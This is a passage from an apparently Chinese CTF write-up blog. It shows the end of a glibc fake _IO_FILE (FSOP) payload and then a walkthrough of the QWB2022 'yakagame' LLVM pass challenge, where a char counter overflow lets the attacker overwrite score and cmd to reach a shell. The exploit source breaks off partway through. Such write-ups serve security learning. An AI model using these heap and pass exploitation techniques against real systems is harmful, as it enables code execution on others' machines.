class="comment">#_wide_data,rax1_addr</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xB0</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _mode = 0</span></span><br><span class="line">fake_IO_FILE = fake_IO_FILE.ljust(<span class="number">0xC8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_IO_FILE += p64(libcbase+<span class="number">0x2160c0</span>+<span class="number">0x10</span>)  <span class="comment"># vtable=IO_wfile_jumps+0x10</span></span><br><span class="line">fake_IO_FILE +=p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>)  <span class="comment"># rax2_addr</span></span><br></pre></td></tr></table></figure><p>可以通过FSOP或者malloc_assert来触发攻击，FSOP最后会调用IO_str_overflow,malloc_assert最后会调用_IO_new_file_xsputn。</p><h2 id="0xF-QWB2022-yakagame"><a href="#0xF-QWB2022-yakagame" class="headerlink" title="0xF.QWB2022 yakagame"></a>0xF.QWB2022 yakagame</h2><p>比赛时因为c++太差，一个功能点没逆明白，没做出来，看了大佬的wp之后发觉自己就差那临门一脚了。</p><p>一道llvmpwn，难度并不算大，yaka.so中实现了一个打boss的功能</p><p><a href="https://imgtu.com/i/v3Mzzn"><img src="https://s1.ax1x.com/2022/08/10/v3Mzzn.png" alt="v3Mzzn.png"></a></p><p>入口函数必须为<code>gamestart</code></p><p><a href="https://imgtu.com/i/v3QCLV"><img src="https://s1.ax1x.com/2022/08/10/v3QCLV.png" alt="v3QCLV.png"></a></p><p>接着如果匹配到fight函数，则需要一个参数index，如果weapon[index]&gt;boss,就将score赋值为weapon[index]-boss，而weapon为char类型，最大值只能为127.</p><p>如果score&gt;0x12345678，就会触发后门函数</p><p><a href="https://imgtu.com/i/v3QTfJ"><img src="https://s1.ax1x.com/2022/08/10/v3QTfJ.png" alt="v3QTfJ.png"></a></p><p>很明显这就是我们的目标</p><p><a href="https://imgtu.com/i/v3QXm6"><img src="https://s1.ax1x.com/2022/08/10/v3QXm6.png" alt="v3QXm6.png"></a></p><p>merge功能要有两个参数index1和index2，实现了weapon[index1]+&#x3D;weapon[index2]的功能。</p><p><a href="https://imgtu.com/i/v3lP1A"><img src="https://s1.ax1x.com/2022/08/10/v3lP1A.png" alt="v3lP1A.png"></a></p><p>destroy功能将指定的weapon清零，upgrade将weapon数组都赋上一个初值。</p><p><a href="https://imgtu.com/i/v3lV78"><img src="https://s1.ax1x.com/2022/08/10/v3lV78.png" alt="v3lV78.png"></a></p><p>还有以上这些功能，对cmd进行操作。</p><p>如果没有匹配到以上任何功能， 就会进入到如下的功能</p><p><a href="https://imgtu.com/i/v3lW3d"><img src="https://s1.ax1x.com/2022/08/10/v3lW3d.png" alt="v3lW3d.png"></a></p><p>这一段涉及到了C++的map库，比赛的时候我就是在这里没看太明白，现在想来当时如果查一下map的用法，写一点demo反编译一下可能就有思路了。</p><p>map和python中的dict类似，其内容都是键值对形式。</p><p>题目中map的类型是&lt;string，char&gt;，即键为string类型，是函数名，值为char类型，是函数的参数。进入while循环中后，会从遍历map，查找是否有值和此时的函数名相同，如果相同的话，就会将weaponlist[v33]赋值为函数的参数，如果不相同就将v33加1。需要注意的是，v33是char类型的，可以向上溢出。</p><p><a href="https://imgtu.com/i/v31LdK"><img src="https://s1.ax1x.com/2022/08/10/v31LdK.png" alt="v31LdK.png"></a></p><p>score和cmd都位于weaponlist上方。</p><p>所以，可以通过这个功能实现对score和cmd的修改。</p><p>将score修改成0，然后就可以调用后门函数了，还得解决cmd的问题，cmd的初始值是一段加密后的值</p><p><a href="https://imgtu.com/i/v386EV"><img src="https://s1.ax1x.com/2022/08/10/v386EV.png" alt="v386EV.png"></a></p><p>上面提到的那几个奇怪的函数就是用来对这段cmd进行解码的。但还有一个更简单的方法，因为opt-8并没有开启PIE，所以我们可以直接从opt-8中找sh字符串的地址，将cmd修改为sh的地址即可。</p><p>exp如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">fight</span><span class="params">(<span class="type">int</span> weapon)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">merge</span><span class="params">(<span class="type">int</span> weapon1, <span class="type">int</span> weapon2)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">destroy</span><span class="params">(<span class="type">int</span> weapon)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">upgrade</span><span class="params">(<span class="type">int</span> val)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">wuxiangdeyidao</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">zhanjinniuza</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">guobapenhuo</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">tiandongwanxiang</span><span class="params">()</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other000</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other001</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other002</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other003</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other004</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other005</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other006</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other007</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other008</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other009</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other010</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other011</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other012</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other013</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other014</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other015</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other016</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other017</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other018</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other019</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other020</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other021</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other022</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other023</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other024</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other025</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other026</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other027</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other028</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other029</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other030</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other031</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other032</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other033</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other034</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other035</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other036</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other037</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other038</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other039</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other040</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other041</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other042</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other043</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other044</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other045</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other046</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other047</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other048</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other049</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other050</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other051</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other052</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other053</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other054</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other055</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other056</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other057</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other058</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other059</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other060</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other061</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other062</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other063</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other064</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other065</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other066</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other067</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other068</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other069</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other070</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other071</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other072</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other073</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other074</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other075</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other076</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other077</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other078</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other079</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other080</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other081</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other082</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">other083</span><span class="params">(<span class="type">int</span> unknown)</span>&#123;<span 